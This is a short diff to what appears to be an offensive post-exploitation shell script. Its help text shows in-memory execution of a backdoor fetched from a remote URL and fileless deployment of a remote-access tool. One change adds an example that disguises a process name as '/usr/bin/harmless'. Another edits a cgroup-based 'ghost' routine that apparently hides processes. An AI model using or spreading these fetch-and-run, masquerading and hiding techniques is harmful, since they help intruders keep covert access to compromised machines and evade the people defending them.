@@ -110,7 +110,7 @@ file-system to deploy your binary/backdoor.
 Examples:
 1. ${CDC}cat /usr/bin/id | memexec -u${CN}
 2. ${CDC}memexec https://thc.org/my-backdoor-binary${CN}
-3. ${CDC}memexec nmap${CN}
+3. ${CDC}NAME=/usr/bin/harmless memexec nmap${CN}
 
 Or a real world example to deploy gsocket without touching the file system
 or /dev/shm or /tmp (Change the -sSECRET please):
@@ -2473,10 +2473,11 @@ _hs_init_ghost() {
     local cg_root="/sys/fs/cgroup"
     # Check for cgroup v2
     [ ! -f "${cg_root}/cgroup.procs" ] && cg_root="/sys/fs/cgroup/unified"
-    [ ! -f "${cg_root}/cgroup.procs" ] && cg_root="$(mount -t cgroup2 | head -n1 | grep -oP '^cgroup2 on \K\S+')"
+    # Not every grep supports -P. Redirect to /dev/null to avoid error message.
+    [ ! -f "${cg_root}/cgroup.procs" ] && cg_root="$(mount -t cgroup2 | head -n1 | grep -oP '^cgroup2 on \K\S+' 2>/dev/null)"
     # Check for cgroup v1
     [ ! -f "${cg_root}/cgroup.procs" ] && cg_root="/sys/fs/cgroup/net_cls"
-    [ ! -f "${cg_root}/cgroup.procs" ] && cg_root="$(mount -t cgroup | grep net_cls | head -n1 | grep -oP '^cgroup on \K\S+')"
+    [ ! -f "${cg_root}/cgroup.procs" ] && cg_root="$(mount -t cgroup | grep net_cls | head -n1 | grep -oP '^cgroup on \K\S+' 2>/dev/null)"
     [ -f "${cg_root}"/update/cgroup.procs ] && {
         _HS_CG_GHOST="${cg_root}/update/cgroup.procs"
         return 0
